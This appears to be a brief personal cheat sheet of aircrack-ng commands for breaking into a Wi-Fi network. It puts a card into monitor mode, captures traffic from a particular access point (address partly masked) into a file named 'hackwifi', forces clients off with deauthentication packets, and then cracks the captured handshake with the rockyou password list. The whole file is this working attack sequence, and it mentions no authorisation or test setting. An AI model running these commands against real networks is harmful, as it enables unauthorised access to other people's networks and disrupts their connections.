# network

** wifi start **

airmon-ng start wlan0

airodump-ng wlan0mon

airodump-ng --bssid 98:F1:99:50:xx:xx -c 4 -w hackwifi-xxx wlan0mon

aireplay-ng -0 4 -a 98:F1:99:50:xx:xx wlan0mon       //別cmd

aircrack-ng ./hack-aterm.cap-06.cap -w ./rockyou.txt 

airmon-ng stop wlan0
